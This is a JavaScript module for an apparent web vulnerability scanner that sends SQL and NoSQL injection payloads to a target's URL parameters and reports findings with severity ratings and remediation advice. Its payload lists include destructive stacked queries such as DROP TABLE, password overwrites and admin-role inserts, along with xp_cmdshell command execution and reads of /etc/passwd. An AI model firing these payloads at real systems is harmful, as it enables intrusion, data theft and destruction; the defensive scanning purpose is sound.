
import { PayloadGenerator } from '../../payloads/PayloadGenerator.js';

export class SQLInjectionScanner {
  constructor(scanner) {
    this.scanner = scanner;
    this.payloadGenerator = new PayloadGenerator();
    this.logger = scanner.logger;
    this.sqlPayloads = this.payloadGenerator.generatePayloads('sqlinjection', {
      applyEncoding: true,
      applyBypasses: true,
      generateMutations: true
    });
    this.dbErrors = this.initializeErrorSignatures();
  }

  initializeErrorSignatures() {
    return {
      mysql: [
        'You have an error in your SQL syntax',
        'mysql_fetch_array()',
        'mysql_fetch_assoc()',
        'mysql_fetch_object()',
        'mysql_numrows()',
        'Warning: mysql_',
        'function.mysql',
        'MySQL result index',
        'MySQL Error',
        'MySQL ODBC',
        'MySQL Driver',
        '[MySQL][ODBC'
      ],
      mssql: [
        'Microsoft OLE DB Provider for ODBC Drivers',
        'Microsoft OLE DB Provider for SQL Server',
        'Incorrect syntax near',
        'Unclosed quotation mark after the character string',
        'Microsoft JET Database Engine',
        '[Microsoft][ODBC Microsoft Access Driver]',
        '[Microsoft][ODBC SQL Server Driver]',
        '[Microsoft][ODBC dBase Driver]',
        'Microsoft SQL Native Client error',
        'SQLSTATE'
      ],
      oracle: [
        'ORA-01756',
        'ORA-00921',
        'ORA-00933',
        'ORA-00936',
        'ORA-00942',
        'ORA-01400',
        'ORA-01722',
        'ORA-01756',
        'ORA-01789',
        'Oracle error',
        'Oracle driver',
        'Warning: oci_',
        'Warning: ora_'
      ],
      postgresql: [
        'PostgreSQL query failed',
        'supplied argument is not a valid PostgreSQL result',
        'unterminated quoted string at or near',
        'pg_connect():',
        'pg_query():',
        'pg_num_rows():',
        'Query failed: ERROR:',
        'Warning: pg_',
        'valid PostgreSQL result',
        'Npgsql.'
      ],
      sqlite: [
        'SQLite/JDBCDriver',
        'SQLite.Exception',
        'System.Data.SQLite.SQLiteException',
        'Warning: sqlite_',
        'function.sqlite',
        '[SQLITE_ERROR]',
        'SQLite error',
        'sqlite3.OperationalError'
      ]
    };
  }

  async scan() {
    this.logger.info('🔍 Starting comprehensive SQL Injection vulnerability scan');
    
    try {
      await this.scanErrorBasedSQLi();
      await this.scanUnionBasedSQLi();
      await this.scanBooleanBasedBlindSQLi();
      await this.scanTimeBasedBlindSQLi();
      await this.scanStackedQueriesSQLi();
      await this.scanSecondOrderSQLi();
      await this.scanNoSQLInjection();
      await this.scanAdvancedSQLi();
      
      this.logger.info('✅ SQL Injection scan completed');
    } catch (error) {
      this.logger.error('❌ Error in SQL Injection scanner:', error);
    }
  }

  async scanErrorBasedSQLi() {
    this.logger.debug('Testing for Error-based SQL Injection vulnerabilities');
    
    const errorPayloads = [
      "'",
      "''",
      "\"",
      "\"\"",
      "')",
      "';",
      "\")",
      "\";",
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)--",
      "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
    ];

    await this.testSQLPayloads(errorPayloads, 'Error-based SQL Injection');
  }

  async scanUnionBasedSQLi() {
    this.logger.debug('Testing for Union-based SQL Injection vulnerabilities');
    
    const unionPayloads = [
      "' UNION SELECT 1--",
      "' UNION SELECT 1,2--",
      "' UNION SELECT 1,2,3--",
      "' UNION SELECT 1,2,3,4--",
      "' UNION SELECT 1,2,3,4,5--",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION ALL SELECT 1,2,3--",
      "' UNION SELECT user(),database(),version()--",
      "' UNION SELECT table_name FROM information_schema.tables--",
      "' UNION SELECT column_name FROM information_schema.columns--"
    ];

    await this.testSQLPayloads(unionPayloads, 'Union-based SQL Injection');
  }

  async scanBooleanBasedBlindSQLi() {
    this.logger.debug('Testing for Boolean-based Blind SQL Injection vulnerabilities');
    
    const booleanPayloads = [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND 'a'='a'--",
      "' AND 'a'='b'--",
      "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      "' AND (SELECT SUBSTRING(@@version,1,1))='4'--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "' AND (SELECT LENGTH(database()))>0--",
      "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
      "' AND ASCII(SUBSTRING((SELECT database()),1,1))<91--"
    ];

    await this.testBooleanBasedSQLi(booleanPayloads);
  }

  async scanTimeBasedBlindSQLi() {
    this.logger.debug('Testing for Time-based Blind SQL Injection vulnerabilities');
    
    const timeBasedPayloads = [
      "'; WAITFOR DELAY '00:00:05'--",
      "'; SELECT SLEEP(5)--",
      "'; pg_sleep(5)--",
      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "'; IF(1=1) WAITFOR DELAY '00:00:05'--",
      "'; BENCHMARK(5000000,MD5(1))--",
      "' AND IF(1=1,SLEEP(5),0)--",
      "' AND IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(5),0)--"
    ];

    await this.testTimeBasedSQLi(timeBasedPayloads);
  }

  async scanStackedQueriesSQLi() {
    this.logger.debug('Testing for Stacked Queries SQL Injection vulnerabilities');
    
    const stackedPayloads = [
      "'; SELECT 1--",
      "'; INSERT INTO test VALUES (1,2,3)--",
      "'; UPDATE users SET password='hacked' WHERE id=1--",
      "'; DROP TABLE test--",
      "'; CREATE TABLE test (id INT)--",
      "'; EXEC xp_cmdshell('dir')--",
      "'; EXEC sp_configure 'show advanced options', 1--"
    ];

    await this.testSQLPayloads(stackedPayloads, 'Stacked Queries SQL Injection');
  }

  async scanSecondOrderSQLi() {
    this.logger.debug('Testing for Second-order SQL Injection vulnerabilities');
    
    const secondOrderPayloads = [
      "admin'; DROP TABLE users; --",
      "test'; INSERT INTO admin VALUES ('hacker','password'); --",
      "user'; UPDATE users SET role='admin' WHERE username='attacker'; --"
    ];

    // This would require more complex logic to test second-order SQLi
    await this.testSQLPayloads(secondOrderPayloads, 'Second-order SQL Injection');
  }

  async scanNoSQLInjection() {
    this.logger.debug('Testing for NoSQL Injection vulnerabilities');
    
    const noSQLPayloads = [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$where": "this.password.match(/.*/)"}',
      '{"$regex": ".*"}',
      '{"$exists": true}',
      '\"; return db.version(); var dummy=\"',
      '\' || \'1\'==\'1',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$where": "sleep(5000)"}',
      '{"$or": [{"username": "admin"}, {"username": "administrator"}]}'
    ];

    await this.testNoSQLPayloads(noSQLPayloads);
  }

  async scanAdvancedSQLi() {
    this.logger.debug('Testing for Advanced SQL Injection techniques');
    
    // Test for database-specific functions
    const advancedPayloads = [
      // MySQL specific
      "' AND (SELECT LOAD_FILE('/etc/passwd'))--",
      "' INTO OUTFILE '/tmp/test.txt'--",
      "' AND (SELECT * FROM mysql.user)--",
      
      // MSSQL specific
      "'; EXEC xp_cmdshell('whoami')--",
      "'; EXEC sp_makewebtask--",
      "' AND 1=CONVERT(int,(SELECT @@version))--",
      
      // PostgreSQL specific
      "'; SELECT pg_ls_dir('/')--",
      "'; COPY (SELECT version()) TO '/tmp/test'--",
      "' AND 1=CAST((SELECT version()) AS INT)--",
      
      // Oracle specific
      "' AND 1=UTL_INADDR.get_host_name((SELECT version FROM v$instance))--",
      "' UNION SELECT table_name FROM all_tables--"
    ];

    await this.testSQLPayloads(advancedPayloads, 'Advanced SQL Injection');
  }

  async testSQLPayloads(payloads, injectionType) {
    const testUrls = await this.discoverTestableParameters();
    
    for (const urlData of testUrls) {
      for (const payload of payloads) {
        try {
          const testUrl = this.buildTestUrl(urlData.url, urlData.parameters, payload);
          const startTime = Date.now();
          const response = await this.scanner.makeRequest(testUrl, {
            timeout: 10000,
            headers: {
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
          });
          const responseTime = Date.now() - startTime;

          if (this.detectSQLError(response) || this.detectSQLiSuccess(response, payload)) {
            await this.reportSQLiVulnerability({
              type: injectionType,
              url: testUrl,
              payload: payload,
              response: response,
              parameter: urlData.parameters[0] || 'unknown',
              method: 'GET',
              responseTime: responseTime
            });
          }
        } catch (error) {
          this.logger.debug('SQL injection test failed:', error.message);
        }
      }
    }
  }

  async testBooleanBasedSQLi(payloads) {
    const testUrls = await this.discoverTestableParameters();
    
    for (const urlData of testUrls) {
      try {
        // Get baseline response
        const baselineUrl = this.buildTestUrl(urlData.url, urlData.parameters, 'test');
        const baselineResponse = await this.scanner.makeRequest(baselineUrl);
        
        // Test true and false conditions
        const truePayload = "' AND 1=1--";
        const falsePayload = "' AND 1=2--";
        
        const trueUrl = this.buildTestUrl(urlData.url, urlData.parameters, truePayload);
        const falseUrl = this.buildTestUrl(urlData.url, urlData.parameters, falsePayload);
        
        const trueResponse = await this.scanner.makeRequest(trueUrl);
        const falseResponse = await this.scanner.makeRequest(falseUrl);
        
        // Compare response differences
        if (this.detectBooleanBasedSQLi(baselineResponse, trueResponse, falseResponse)) {
          await this.reportSQLiVulnerability({
            type: 'Boolean-based Blind SQL Injection',
            url: trueUrl,
            payload: truePayload,
            response: trueResponse,
            parameter: urlData.parameters[0] || 'unknown',
            method: 'GET',
            evidence: 'Different responses for true/false conditions indicate boolean-based blind SQLi'
          });
        }
      } catch (error) {
        this.logger.debug('Boolean-based SQLi test failed:', error.message);
      }
    }
  }

  async testTimeBasedSQLi(payloads) {
    const testUrls = await this.discoverTestableParameters();
    
    for (const urlData of testUrls) {
      for (const payload of payloads) {
        try {
          const testUrl = this.buildTestUrl(urlData.url, urlData.parameters, payload);
          const startTime = Date.now();
          const response = await this.scanner.makeRequest(testUrl, {
            timeout: 15000
          });
          const responseTime = Date.now() - startTime;

          // Check if response took significantly longer (indicating time-based SQLi)
          if (responseTime > 4000) { // 4+ seconds delay
            await this.reportSQLiVulnerability({
              type: 'Time-based Blind SQL Injection',
              url: testUrl,
              payload: payload,
              response: response,
              parameter: urlData.parameters[0] || 'unknown',
              method: 'GET',
              responseTime: responseTime,
              evidence: `Response delayed by ${responseTime}ms, indicating time-based blind SQLi`
            });
          }
        } catch (error) {
          if (error.code === 'ECONNABORTED' && error.message.includes('timeout')) {
            // Timeout might indicate successful time-based SQLi
            await this.reportSQLiVulnerability({
              type: 'Time-based Blind SQL Injection',
              url: this.buildTestUrl(urlData.url, urlData.parameters, payload),
              payload: payload,
              parameter: urlData.parameters[0] || 'unknown',
              method: 'GET',
              evidence: 'Request timeout indicates successful time-based blind SQLi'
            });
          } else {
            this.logger.debug('Time-based SQLi test failed:', error.message);
          }
        }
      }
    }
  }

  async testNoSQLPayloads(payloads) {
    const testUrls = await this.discoverTestableParameters();
    
    for (const urlData of testUrls) {
      for (const payload of payloads) {
        try {
          // Test in URL parameter
          const testUrl = this.buildTestUrl(urlData.url, urlData.parameters, payload);
          const response = await this.scanner.makeRequest(testUrl);
          
          if (this.detectNoSQLiSuccess(response, payload)) {
            await this.reportSQLiVulnerability({
              type: 'NoSQL Injection',
              url: testUrl,
              payload: payload,
              response: response,
              parameter: urlData.parameters[0] || 'unknown',
              method: 'GET'
            });
          }

          // Test in JSON POST data
          const jsonPayload = JSON.stringify({ [urlData.parameters[0] || 'test']: JSON.parse(payload) });
          const postResponse = await this.scanner.makeRequest(urlData.url, {
            method: 'POST',
            data: jsonPayload,
            headers: {
              'Content-Type': 'application/json'
            }
          });

          if (this.detectNoSQLiSuccess(postResponse, payload)) {
            await this.reportSQLiVulnerability({
              type: 'NoSQL Injection',
              url: urlData.url,
              payload: jsonPayload,
              response: postResponse,
              parameter: urlData.parameters[0] || 'unknown',
              method: 'POST'
            });
          }
        } catch (error) {
          this.logger.debug('NoSQL injection test failed:', error.message);
        }
      }
    }
  }

  async discoverTestableParameters() {
    const urls = [];
    
    try {
      const response = await this.scanner.makeRequest(this.scanner.target);
      
      // Extract URLs with parameters from HTML
      const urlRegex = /(?:href|src|action)=['"]([^'"]*\?[^'"]*)['"]/gi;
      let match;
      
      while ((match = urlRegex.exec(response.data)) !== null) {
        const url = match[1];
        const [baseUrl, queryString] = url.split('?');
        
        if (queryString) {
          const parameters = queryString.split('&').map(param => param.split('=')[0]);
          urls.push({
            url: this.resolveUrl(baseUrl),
            parameters: parameters
          });
        }
      }
      
      // Add common parameter names if no URLs found
      if (urls.length === 0) {
        const commonParams = ['id', 'user', 'page', 'category', 'search', 'query', 'item', 'product'];
        urls.push({
          url: this.scanner.target,
          parameters: commonParams
        });
      }
    } catch (error) {
      this.logger.debug('Parameter discovery failed:', error.message);
      urls.push({
        url: this.scanner.target,
        parameters: ['id']
      });
    }
    
    return urls;
  }

  buildTestUrl(baseUrl, parameters, payload) {
    const url = new URL(baseUrl);
    
    // Add payload to first parameter
    if (parameters.length > 0) {
      url.searchParams.set(parameters[0], payload);
    } else {
      url.searchParams.set('id', payload);
    }
    
    return url.toString();
  }

  resolveUrl(url) {
    if (url.startsWith('http')) {
      return url;
    } else if (url.startsWith('/')) {
      const target = new URL(this.scanner.target);
      return `${target.protocol}//${target.host}${url}`;
    } else {
      return `${this.scanner.target}/${url}`;
    }
  }

  detectSQLError(response) {
    if (!response || !response.data) return false;
    
    const responseBody = response.data.toLowerCase();
    
    // Check for database error messages
    for (const dbType in this.dbErrors) {
      for (const errorPattern of this.dbErrors[dbType]) {
        if (responseBody.includes(errorPattern.toLowerCase())) {
          return true;
        }
      }
    }
    
    // Check for generic SQL error indicators
    const sqlErrorIndicators = [
      'sql syntax',
      'database error',
      'warning: mysql',
      'valid mysql result',
      'ora-',
      'sqlstate',
      'syntax error',
      'unclosed quotation',
      'quoted string not properly terminated'
    ];
    
    return sqlErrorIndicators.some(indicator => responseBody.includes(indicator));
  }

  detectSQLiSuccess(response, payload) {
    if (!response || !response.data) return false;
    
    const responseBody = response.data.toLowerCase();
    
    // Check for successful union-based injection indicators
    if (payload.toLowerCase().includes('union')) {
      const unionIndicators = ['1', '2', '3', '4', '5'];
      return unionIndicators.some(indicator => responseBody.includes(indicator));
    }
    
    // Check for version disclosure
    const versionIndicators = [
      'mysql',
      'mariadb', 
      'postgresql',
      'microsoft sql server',
      'oracle',
      'sqlite'
    ];
    
    return versionIndicators.some(indicator => responseBody.includes(indicator));
  }

  detectBooleanBasedSQLi(baselineResponse, trueResponse, falseResponse) {
    if (!baselineResponse || !trueResponse || !falseResponse) return false;
    
    const baselineLength = baselineResponse.data ? baselineResponse.data.length : 0;
    const trueLength = trueResponse.data ? trueResponse.data.length : 0;
    const falseLength = falseResponse.data ? falseResponse.data.length : 0;
    
    // Check for significant differences in response lengths
    const trueDiff = Math.abs(baselineLength - trueLength);
    const falseDiff = Math.abs(baselineLength - falseLength);
    
    // If true condition returns similar to baseline but false is different
    return trueDiff < 100 && falseDiff > 100;
  }

  detectNoSQLiSuccess(response, payload) {
    if (!response || !response.data) return false;
    
    const responseBody = response.data.toLowerCase();
    
    // Check for NoSQL-specific indicators
    const noSQLIndicators = [
      'mongodb',
      'couchdb',
      'redis',
      'cassandra',
      'bson',
      'objectid'
    ];
    
    return noSQLIndicators.some(indicator => responseBody.includes(indicator));
  }

  async reportSQLiVulnerability(details) {
    const vulnerability = {
      title: `SQL Injection - ${details.type}`,
      severity: this.calculateSQLiSeverity(details.type),
      category: 'SQL Injection',
      type: details.type,
      url: details.url,
      method: details.method,
      parameter: details.parameter,
      payload: details.payload,
      evidence: details.evidence || this.extractSQLEvidence(details.response, details.payload),
      impact: this.getSQLiImpact(details.type),
      recommendation: this.getSQLiRecommendation(),
      owasp: ['A1 - Injection'],
      cwe: 'CWE-89',
      cvss: this.calculateSQLiCVSS(details.type),
      poc: this.generateSQLiPOC(details),
      steps: this.generateSQLiSteps(details),
      responseTime: details.responseTime
    };

    this.scanner.addVulnerability(vulnerability);
  }

  calculateSQLiSeverity(type) {
    const severityMap = {
      'Error-based SQL Injection': 'High',
      'Union-based SQL Injection': 'High',
      'Boolean-based Blind SQL Injection': 'High',
      'Time-based Blind SQL Injection': 'High',
      'Stacked Queries SQL Injection': 'Critical',
      'Second-order SQL Injection': 'High',
      'NoSQL Injection': 'High',
      'Advanced SQL Injection': 'Critical'
    };
    
    return severityMap[type] || 'High';
  }

  getSQLiImpact(type) {
    const impacts = {
      'Error-based SQL Injection': 'Database information disclosure, potential data extraction through error messages',
      'Union-based SQL Injection': 'Complete database compromise, data extraction, potential system access',
      'Boolean-based Blind SQL Injection': 'Data extraction through boolean logic, database enumeration',
      'Time-based Blind SQL Injection': 'Data extraction through timing attacks, database enumeration',
      'Stacked Queries SQL Injection': 'Multiple query execution, potential system command execution, complete database compromise',
      'Second-order SQL Injection': 'Delayed SQL injection execution, persistent database compromise',
      'NoSQL Injection': 'NoSQL database compromise, data extraction, authentication bypass',
      'Advanced SQL Injection': 'Advanced database exploitation, potential system access, file system access'
    };
    
    return impacts[type] || 'Database compromise and unauthorized data access';
  }

  getSQLiRecommendation() {
    return [
      'Use parameterized queries/prepared statements',
      'Implement proper input validation and sanitization',
      'Apply principle of least privilege to database accounts',
      'Use stored procedures with proper input validation',
      'Implement web application firewall (WAF)',
      'Regular security testing and code review',
      'Escape all user input before database queries',
      'Use ORM frameworks with built-in SQL injection protection'
    ].join('; ');
  }

  calculateSQLiCVSS(type) {
    const cvssMap = {
      'Error-based SQL Injection': '7.5',
      'Union-based SQL Injection': '9.8',
      'Boolean-based Blind SQL Injection': '7.5',
      'Time-based Blind SQL Injection': '7.5',
      'Stacked Queries SQL Injection': '9.8',
      'Second-order SQL Injection': '8.8',
      'NoSQL Injection': '8.1',
      'Advanced SQL Injection': '9.8'
    };
    
    return cvssMap[type] || '7.5';
  }

  extractSQLEvidence(response, payload) {
    if (!response || !response.data) return 'No response data available';
    
    const responseBody = response.data;
    const lines = responseBody.split('\n');
    const evidenceLines = [];
    
    // Find lines containing SQL errors or payload
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i].toLowerCase();
      if (this.detectSQLError({ data: line }) || line.includes(payload.toLowerCase())) {
        evidenceLines.push(`Line ${i + 1}: ${lines[i].trim()}`);
        if (evidenceLines.length >= 3) break; // Limit evidence lines
      }
    }
    
    return evidenceLines.length > 0 ? evidenceLines.join('\n') : 'SQL injection indicators found in response';
  }

  generateSQLiPOC(details) {
    return {
      description: `Proof of Concept for ${details.type}`,
      steps: [
        `1. Navigate to: ${details.url}`,
        `2. Insert SQL payload: ${details.payload}`,
        `3. Submit request using ${details.method} method`,
        `4. Observe database error or data extraction in response`
      ],
      curl: this.generateSQLiCurlCommand(details),
      expectedResult: 'Database error messages or unauthorized data should be visible in the response'
    };
  }

  generateSQLiSteps(details) {
    return [
      'Identify injection point in the application',
      'Test for SQL injection with basic payloads',
      'Confirm vulnerability with database-specific payloads',
      'Extract database information (version, structure)',
      'Demonstrate data extraction capability',
      'Document the complete attack vector'
    ];
  }

  generateSQLiCurlCommand(details) {
    return `curl -X ${details.method} "${details.url}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"`;
  }
}
